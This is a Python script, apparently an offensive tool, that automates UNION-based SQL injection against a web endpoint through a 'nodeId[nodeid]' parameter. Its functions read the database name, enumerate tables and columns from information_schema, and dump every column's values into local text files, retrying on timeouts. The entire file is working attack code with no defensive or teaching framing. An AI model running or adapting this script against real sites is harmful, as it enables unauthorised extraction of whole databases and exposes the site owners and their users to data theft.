from requests import ReadTimeout, ConnectTimeout

from tools import *


def get_database(url):
    data = 'nodeId[nodeid]=1+UNION+SELECT+26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,database(),8,7,6,5,4,3,2,1--'
    res = my_post(url, data)
    print(res.json()['rawtext'])


def get_tablelist(url, code=0):
    i = code
    tablename_list = []
    while True:
        data = 'nodeId[nodeid]=1+UNION+SELECT+26,25,24,23,22,21,20,19,20,17,16,\
            15,14,13,12,11,10,table_name,8,7,6,5,4,3,2,1+from+information_schema.tables+where+\
            table_schema=database()+limit+' + str(i) + ',' + str((i + 1)) + '--'
        try:
            res = my_post(url, data)
        except (ReadTimeout, ConnectTimeout) as e:
            print('出现错误，原因' + str(e))
            get_tablelist(url, i)
        # if 'note:null' in res.text:
        #    break
        try:
            write('table_name.txt', res.json()['rawtext'])
            write('table_name.txt', '\n')
            print(res.json()['rawtext'])
        except KeyError as k:
            print('数据读取完成！')
            exit(0)
        i += 1


def get_colums_list(url):
    i = 0
    tbname_list = read('table_name.txt')
    for x in tbname_list:
        tbname = x.rstrip()

        def inner(i):
            while True:
                try:
                    data = 'nodeId[nodeid]=1+UNION+SELECT+26,25,24,23,22,21,20,19,20,17,16,\
                            15,14,13,12,11,10,column_name,8,7,6,5,4,3,2,1+from+information_schema.columns+where+\
                            table_schema=database()\
                            +and+table_name="' + tbname + '"+limit+' + str(i) + ',' + str((i + 1)) + '--'
                    res = my_post(url, data)
                    # print(res.text)
                    columns = res.json()['rawtext']
                    write('columns.txt', tbname + ':' + columns)
                    write('columns.txt', '\n')
                    print(tbname + ':' + columns)
                    # print(data)
                    i += 1
                except (ReadTimeout, ConnectTimeout) as e:
                    print('正在重试!错误原因:' + str(e))
                    inner(i)
                except KeyError as k:
                    break

        inner(i)
        print('获取字段完成!')


def dump_data(url):
    dic_column = read('columns.txt')
    for d in dic_column:
        tc = d.rstrip('\n')
        tb, cl = tc.split(':')
        # print(tb,cl)
        i = 0

        def inner(i):
            while True:
                data = 'nodeId[nodeid]=1+UNION+SELECT+26,25,24,23,22,21,20,19,20,17,16,\
                                        15,14,13,12,11,10,' + cl + ',8,7,6,5,4,3,2,1+from+' + tb + '+limit+' + str(
                    i) + ',' + str((i + 1)) + '--'
                try:
                    res = my_post(url, data)
                    content = res.json()['rawtext']
                    print(tb, cl)
                    print(content)
                    write('value.txt', tb + ':' + cl + ':' + content)
                    write('value.txt', '\n')
                    i += 1
                except KeyError as k:
                    break
                except (ReadTimeout, ConnectTimeout) as e:
                    print(str(e))
                    inner(i)

        inner(i)
